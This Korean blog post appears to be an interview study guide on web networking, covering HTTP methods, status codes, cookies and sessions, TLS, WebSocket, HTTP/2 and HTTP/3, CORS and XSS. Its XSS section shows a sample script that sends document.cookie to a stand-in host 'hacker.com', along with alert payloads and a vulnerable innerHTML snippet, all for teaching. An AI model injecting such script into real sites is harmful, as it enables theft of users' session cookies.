---
layout: post
title: "CS Network 면접 완전 정복 가이드"
date: 2025-07-24
categories: [CS, Network]
tags: [CS, 네트워크, 면접, HTTP, HTTPS, 쿠키, 세션, 웹소켓, CORS, XSS]
---

# Network 면접 완전 정복 가이드

## 웹 통신의 전체적인 흐름 이해하기

웹 애플리케이션에서 클라이언트와 서버 간의 통신은 복잡하지만 체계적인 과정입니다. 이 모든 과정을 하나의 스토리로 연결해서 설명해드리겠습니다.

---

## 1. HTTP 통신의 기본 구조

### HTTP란 무엇인가?

**HTTP(HyperText Transfer Protocol)**는 웹에서 클라이언트와 서버 간에 데이터를 주고받기 위한 **애플리케이션 계층 프로토콜**입니다. HTTP는 **Stateless(무상태)**와 **Connectionless(비연결성)** 특성을 가집니다.

**Stateless**란 서버가 클라이언트의 이전 요청 상태를 기억하지 않는다는 의미입니다. 예를 들어:
```
클라이언트: "안녕하세요, 로그인 페이지를 주세요"
서버: "여기 로그인 페이지입니다"
클라이언트: "로그인했어요, 마이페이지를 주세요"
서버: "누구세요? 로그인 정보가 없네요" (이전 요청을 기억하지 못함)
```

**Connectionless**는 요청-응답이 완료되면 연결을 끊는다는 의미입니다. 전화로 비유하면, 질문 하나 할 때마다 전화를 걸었다가 답변 듣고 바로 끊는 것과 같습니다.

### 왜 HTTP는 Stateless 구조를 채택했을까?

1. **확장성(Scalability)**: 서버가 클라이언트 상태를 저장하지 않으므로 여러 서버에 요청을 분산시키기 쉽습니다.
2. **단순성**: 각 요청이 독립적이므로 구현이 단순합니다.
3. **안정성**: 서버 장애 시 상태 정보 손실 걱정이 없습니다.

하지만 이로 인해 **상태 관리**라는 문제가 발생합니다. 이를 해결하기 위해 **쿠키**와 **세션**이 등장했습니다.

---

## 2. 상태 관리: 쿠키와 세션

### 쿠키(Cookie)

**쿠키**는 클라이언트(브라우저)에 저장되는 작은 데이터 조각입니다.

**동작 과정:**
```
1. 클라이언트: "로그인 요청 (ID: hong, PW: 1234)"
2. 서버: "로그인 성공! Set-Cookie: sessionId=ABC123"
3. 클라이언트: 쿠키를 브라우저에 저장
4. 다음 요청 시: "Cookie: sessionId=ABC123"과 함께 요청
```

**특징:**
- 클라이언트에 저장
- 용량 제한 (4KB)
- 보안에 취약 (클라이언트에서 수정 가능)
- 만료시간 설정 가능

### 세션(Session)

**세션**은 서버에 저장되는 클라이언트의 상태 정보입니다.

**동작 과정:**
```
1. 클라이언트: 로그인 요청
2. 서버: 세션 생성 후 세션ID를 쿠키로 전송
3. 서버 메모리: {sessionId: "ABC123", userId: "hong", loginTime: "2024-01-01"}
4. 클라이언트: 다음 요청 시 세션ID 쿠키 전송
5. 서버: 세션ID로 사용자 정보 조회
```

**쿠키 vs 세션 비교:**
- **저장 위치**: 쿠키(클라이언트) vs 세션(서버)
- **보안성**: 쿠키(낮음) vs 세션(높음)
- **용량**: 쿠키(4KB 제한) vs 세션(서버 메모리 한계)
- **서버 부담**: 쿠키(없음) vs 세션(메모리 사용)

---

## 3. HTTP 요청 방식: HTTP Methods

### 주요 HTTP Method들

**GET**: 데이터 조회
```
GET /users/123 HTTP/1.1
Host: api.example.com
```

**POST**: 새로운 데이터 생성
```
POST /users HTTP/1.1
Content-Type: application/json

{"name": "홍길동", "email": "hong@example.com"}
```

**PUT**: 전체 데이터 수정 (덮어쓰기)
```
PUT /users/123 HTTP/1.1
Content-Type: application/json

{"name": "홍길동", "email": "hong@gmail.com", "age": 25}
```

**PATCH**: 부분 데이터 수정
```
PATCH /users/123 HTTP/1.1
Content-Type: application/json

{"email": "hong@gmail.com"}
```

**DELETE**: 데이터 삭제
```
DELETE /users/123 HTTP/1.1
```

### HTTP Method의 멱등성(Idempotent)

**멱등성**이란 같은 요청을 여러 번 해도 결과가 동일한 성질입니다.

**멱등한 메서드:**
- **GET**: 조회는 몇 번을 해도 데이터가 변하지 않음
- **PUT**: 전체 덮어쓰기이므로 같은 데이터로 몇 번을 해도 결과가 동일
- **DELETE**: 이미 삭제된 데이터를 다시 삭제해도 결과는 동일

**멱등하지 않은 메서드:**
- **POST**: 새 데이터 생성이므로 요청할 때마다 새로운 리소스가 생성됨

### GET과 POST의 차이

| 구분 | GET | POST |
|------|-----|------|
| 목적 | 데이터 조회 | 데이터 생성/전송 |
| 데이터 위치 | URL 파라미터 | Request Body |
| 캐싱 | 가능 | 불가능 |
| 브라우저 히스토리 | 남음 | 남지 않음 |
| 길이 제한 | 있음 (URL 길이) | 없음 |
| 보안 | 낮음 (URL에 노출) | 높음 (Body에 포함) |

### POST vs PUT vs PATCH

```
현재 사용자 데이터: {"id": 1, "name": "홍길동", "email": "hong@old.com", "age": 20}

POST /users          → 새 사용자 생성 (ID: 2가 생성됨)
PUT /users/1         → 전체 덮어쓰기 {"name": "김철수", "email": "kim@new.com", "age": 25}
PATCH /users/1       → 부분 수정 {"email": "hong@new.com"} (name, age는 유지)
```

### GET에 Body를 사용하지 않는 이유

HTTP/1.1부터 기술적으로는 GET에 Body 사용이 가능하지만, 여전히 지양하는 이유:

1. **의미적 일관성**: GET은 조회 목적이므로 데이터 변경을 의미하는 Body와 맞지 않음
2. **캐싱 문제**: 프록시나 브라우저가 Body를 고려하지 않고 캐싱할 수 있음
3. **서버/라이브러리 호환성**: 일부 서버나 라이브러리가 GET Body를 무시할 수 있음
4. **로깅/모니터링**: 대부분의 로깅 도구가 GET Body를 기록하지 않음

---

## 4. HTTP 응답 코드와 통신 결과

### 주요 응답 코드 분류

**1xx (정보)**: 요청이 수신되어 처리 중
**2xx (성공)**: 요청이 성공적으로 처리됨
**3xx (리다이렉션)**: 요청 완료를 위해 추가 작업 필요
**4xx (클라이언트 오류)**: 클라이언트 요청에 오류가 있음
**5xx (서버 오류)**: 서버가 요청을 처리하지 못함

### 면접에서 자주 묻는 응답 코드들

**200 (OK) vs 201 (Created)**
- **200**: 요청이 성공했고, 응답 본문에 결과가 포함됨
```
GET /users/123 → 200 OK + 사용자 정보 반환
PUT /users/123 → 200 OK + 수정된 사용자 정보 반환
```

- **201**: 새로운 리소스가 성공적으로 생성됨
```
POST /users → 201 Created + 새로 생성된 사용자 정보 반환
Location: /users/124 (새 리소스의 위치)
```

**401 (Unauthorized) vs 403 (Forbidden)**
- **401**: 인증이 필요함 (로그인하지 않음)
```
GET /mypage → 401 Unauthorized
WWW-Authenticate: Bearer (로그인 페이지로 리다이렉트)
```

- **403**: 인증은 되었지만 권한이 없음 (로그인했지만 접근 권한 없음)
```
DELETE /admin/users/123 → 403 Forbidden (일반 사용자가 관리자 기능 접근)
```

### 커스텀 응답 코드 (285번 같은)

**가능하지만 권장하지 않는 이유:**
1. **표준성**: RFC 7231에서 정의되지 않은 코드는 클라이언트가 이해하지 못할 수 있음
2. **호환성**: 프록시, 방화벽, 브라우저가 예상치 못한 동작을 할 수 있음
3. **유지보수**: 개발자들이 의미를 파악하기 어려움

**대안:**
- 200번대 코드 + 응답 본문에 상세 정보 포함
- 표준 코드 중 가장 유사한 의미의 코드 사용

---

## 5. HTTPS와 보안

### HTTP의 보안 문제

HTTP는 **평문 통신**이므로 다음과 같은 보안 취약점이 있습니다:
- **도청(Eavesdropping)**: 중간에서 데이터를 엿볼 수 있음
- **변조(Tampering)**: 전송 중인 데이터를 수정할 수 있음
- **위장(Spoofing)**: 서버나 클라이언트를 가장할 수 있음

### HTTPS의 등장

**HTTPS**는 HTTP에 **SSL/TLS**라는 보안 계층을 추가한 프로토콜입니다.

### 공개키와 대칭키 암호화

**대칭키 암호화:**
- 암호화와 복호화에 같은 키 사용
- 속도가 빠름
- 키 배송 문제 (키를 안전하게 전달하기 어려움)

```
평문: "안녕하세요"
키: "SECRET123"
암호문: "X#9kL@mP2"
복호화: "X#9kL@mP2" + "SECRET123" → "안녕하세요"
```

**공개키 암호화:**
- 공개키(누구나 알 수 있음)와 개인키(본인만 알고 있음) 쌍 사용
- 속도가 느림
- 키 배송 문제 해결

```
A가 B에게 메시지 전송:
1. B의 공개키로 암호화 → B의 개인키로만 복호화 가능
2. A의 개인키로 서명 → A의 공개키로 서명 검증
```

### HTTPS Handshake 과정

**왜 인증서를 사용할까?**
공개키 암호화의 핵심 문제는 "이 공개키가 정말 네이버의 공개키가 맞나?"입니다. 이를 해결하기 위해 **신뢰할 수 있는 제3자(CA, Certificate Authority)**가 발급한 **디지털 인증서**를 사용합니다.

**HTTPS Handshake 과정:**
```
1. Client Hello: 클라이언트가 지원하는 암호화 방식 목록 전송
2. Server Hello: 서버가 선택한 암호화 방식 + 인증서 전송
3. 인증서 검증: 클라이언트가 CA의 공개키로 인증서 유효성 확인
4. 키 교환: 클라이언트가 대칭키를 서버의 공개키로 암호화해서 전송
5. 암호화 통신 시작: 이후 모든 통신은 대칭키로 암호화
```

### SSL vs TLS

- **SSL(Secure Sockets Layer)**: 넷스케이프에서 개발한 초기 보안 프로토콜
- **TLS(Transport Layer Security)**: SSL의 후속 표준 (SSL 3.0 → TLS 1.0)
- 현재는 **TLS**가 표준이지만, 관습적으로 SSL이라고 부르기도 함

**버전 발전:**
- SSL 1.0, 2.0, 3.0 (보안 취약점으로 사용 중단)
- TLS 1.0, 1.1 (사용 중단 권고)
- **TLS 1.2, 1.3** (현재 사용 중)

---

## 6. 실시간 통신: 소켓과 웹소켓

### HTTP의 한계

HTTP는 **요청-응답 모델**이므로 실시간 통신에 한계가 있습니다:
- 클라이언트만 요청을 시작할 수 있음
- 서버에서 클라이언트로 능동적으로 데이터를 보낼 수 없음

### 소켓(Socket) 통신

**소켓**은 네트워크 통신을 위한 **엔드포인트**입니다. 전화기에 비유하면, 소켓은 전화기 자체이고, 포트는 전화번호입니다.

**소켓의 구성요소:**
- IP 주소 + 포트 번호 + 프로토콜
- 예: (192.168.1.100, 8080, TCP)

### 소켓과 포트의 차이

**포트**는 하나의 컴퓨터에서 여러 네트워크 서비스를 구분하기 위한 번호입니다.

```
웹 서버 (192.168.1.100):
- 80번 포트: HTTP 서비스
- 443번 포트: HTTPS 서비스
- 3306번 포트: MySQL 서비스
```

**소켓**은 실제 통신 연결 자체입니다:
```
클라이언트 소켓: (클라이언트IP:랜덤포트) ↔ 서버 소켓: (서버IP:80)
예: (192.168.1.200:54321) ↔ (192.168.1.100:80)
```

### 여러 소켓의 포트 번호

**서버 측**: 같은 포트(예: 80번)를 여러 클라이언트가 공유할 수 있습니다.
```
클라이언트1: (IP1:port1) ↔ 서버: (ServerIP:80)
클라이언트2: (IP2:port2) ↔ 서버: (ServerIP:80)
클라이언트3: (IP3:port3) ↔ 서버: (ServerIP:80)
```

**클라이언트 측**: 각 연결마다 다른 포트를 사용합니다.

### 사용자 요청과 소켓 생성

요청이 많아지면 소켓도 많이 생성되지만, **Connection Pool**과 **Keep-Alive**로 최적화합니다:

```
일반적인 경우: 요청 1개 = 소켓 1개 생성
Connection Pool 사용: 미리 생성한 소켓을 재사용
Keep-Alive 사용: 요청 완료 후에도 연결 유지
```

### 웹소켓(WebSocket)

**웹소켓**은 HTTP를 기반으로 시작하지만, **전이중 통신(Full-Duplex)**이 가능한 프로토콜입니다.

**웹소켓 연결 과정:**
```
1. HTTP 요청: Upgrade: websocket, Connection: Upgrade
2. 서버 응답: 101 Switching Protocols
3. 웹소켓 연결 성립: 양방향 실시간 통신 가능
```

**소켓 통신 vs 웹소켓:**
- **소켓**: OS 레벨의 네트워크 API, TCP/UDP 직접 사용
- **웹소켓**: 웹 표준 프로토콜, 브라우저에서 사용 가능

---

## 7. HTTP 성능 최적화: 버전별 발전

### HTTP/1.1의 문제점

**HOL(Head-of-Line) Blocking**: 하나의 요청이 지연되면 뒤의 모든 요청이 대기

```
HTTP/1.1에서 3개 파일 요청:
[요청1: style.css] → 5초 걸림
[요청2: script.js] → 대기... (HOL Blocking)
[요청3: image.png] → 대기... (HOL Blocking)
```

**해결 방법들:**
- **Connection Pool**: 여러 개의 연결을 동시에 사용
- **Domain Sharding**: 여러 도메인으로 분산하여 요청

### HTTP/2의 개선사항

**주요 특징:**

1. **Multiplexing**: 하나의 연결로 여러 요청을 병렬 처리
```
HTTP/2에서 3개 파일 요청:
[요청1: style.css] ━━━━━━━━━━┓
[요청2: script.js]  ━━━━━━━┫ 동시 처리
[요청3: image.png]  ━━━━━━━┛
```

2. **Server Push**: 서버가 능동적으로 리소스를 전송
```
클라이언트: "index.html 주세요"
서버: "index.html과 함께 style.css, script.js도 보내드릴게요" (미리 전송)
```

3. **Header Compression (HPACK)**: 헤더 압축으로 대역폭 절약

4. **Binary Protocol**: 텍스트 대신 바이너리로 전송하여 파싱 속도 향상

### HTTP/3.0 (HTTP over QUIC)

**주요 특징:**

1. **UDP 기반**: TCP 대신 UDP 사용으로 연결 설정 시간 단축
2. **연결 마이그레이션**: 네트워크가 바뀌어도 연결 유지 (모바일 환경에 유리)
3. **개선된 보안**: TLS 1.3이 기본으로 통합
4. **HOL Blocking 완전 해결**: 스트림 레벨에서 독립적 처리

**연결 시간 비교:**
```
HTTP/1.1: TCP 3-way handshake + TLS handshake = 2-3 RTT
HTTP/2: 동일 (TCP 기반)
HTTP/3: QUIC 0-RTT 또는 1-RTT로 연결 성립
```

---

## 8. 연결 유지: Keep-Alive

### TCP Keep-Alive

**목적**: TCP 연결이 살아있는지 확인
**동작**: 주기적으로 probe 패킷을 전송하여 연결 상태 확인
**설정 위치**: OS 레벨 (소켓 옵션)

```
설정 예시:
- Keep-Alive 간격: 2시간
- Probe 간격: 75초  
- Probe 횟수: 9회
```

### HTTP Keep-Alive

**목적**: HTTP 연결을 재사용하여 성능 향상
**동작**: 요청-응답 완료 후에도 TCP 연결 유지
**설정 위치**: HTTP 헤더

```
HTTP/1.1에서:
Connection: keep-alive
Keep-Alive: timeout=5, max=1000

요청1 → 응답1 (연결 유지)
요청2 → 응답2 (같은 연결 재사용)
요청3 → 응답3 (같은 연결 재사용)
```

**차이점:**
- **TCP Keep-Alive**: 연결 **상태 확인**
- **HTTP Keep-Alive**: 연결 **재사용**

---

## 9. 웹 보안: SOP, CORS, XSS

### SOP (Same-Origin Policy)

**동일 출처 정책**은 웹 브라우저의 핵심 보안 정책입니다.

**Origin(출처) = 프로토콜 + 도메인 + 포트**

```
https://example.com:443/page1
https://example.com:443/page2  → 같은 출처 ✅
https://example.com:8080/page1 → 다른 출처 ❌ (포트 다름)
http://example.com:443/page1   → 다른 출처 ❌ (프로토콜 다름)
https://sub.example.com:443/page1 → 다른 출처 ❌ (도메인 다름)
```

**SOP가 차단하는 것들:**
- 다른 출처의 AJAX 요청
- 다른 출처의 DOM 접근
- 다른 출처의 로컬 스토리지 접근

### CORS (Cross-Origin Resource Sharing)

**CORS**는 SOP의 예외를 허용하는 메커니즘입니다.

**Simple Request (간단한 요청):**
```
GET, HEAD, POST 메서드
Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
사용자 정의 헤더 없음

예시:
GET https://api.example.com/users
Origin: https://mysite.com

응답:
Access-Control-Allow-Origin: https://mysite.com
```

### Preflight Request

**복잡한 요청**의 경우 실제 요청 전에 **OPTIONS 메서드**로 사전 확인을 합니다.

```
실제 요청: PUT https://api.example.com/users/123
Content-Type: application/json

Preflight 요청:
OPTIONS https://api.example.com/users/123
Origin: https://mysite.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type

Preflight 응답:
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 86400

↓ Preflight 성공 후 실제 요청 전송
```

### XSS (Cross-Site Scripting)

**XSS**는 악성 스크립트를 웹 페이지에 삽입하는 공격입니다.

**Stored XSS (저장형):**
```
1. 공격자가 게시판에 악성 스크립트 작성:
   <script>location.href='http://hacker.com?cookie='+document.cookie</script>

2. 피해자가 해당 게시글 조회
3. 스크립트 실행으로 쿠키가 공격자에게 전송
```

**Reflected XSS (반사형):**
```
악성 URL: https://site.com/search?q=<script>alert('XSS')</script>
피해자가 URL 클릭 시 스크립트 실행
```

**DOM-based XSS:**
```javascript
// 취약한 코드
document.getElementById('welcome').innerHTML = 
    "안녕하세요, " + location.hash.substring(1) + "님";

// 악성 URL
https://site.com#<script>alert('XSS')</script>
```

### XSS vs CSRF 차이점

**XSS**: 사용자의 브라우저에서 **악성 스크립트를 실행**시키는 공격
**CSRF**: 사용자가 **의도하지 않은 요청을 전송**하게 만드는 공격

```
XSS 공격 흐름:
공격자 → 악성 스크립트 삽입 → 피해자 브라우저에서 실행

CSRF 공격 흐름:
피해자가 정상 사이트 로그인 → 공격자 사이트 방문 → 공격자 사이트에서 정상 사이트로 요청 전송
```

### XSS 방어 방법

**프론트엔드만으로는 완전한 방어 불가능**

**백엔드 방어:**
- **입력값 검증**: HTML 태그 필터링
- **출력값 인코딩**: <, >, &, " 등을 HTML 엔티티로 변환
- **CSP(Content Security Policy)**: 스크립트 실행 정책 설정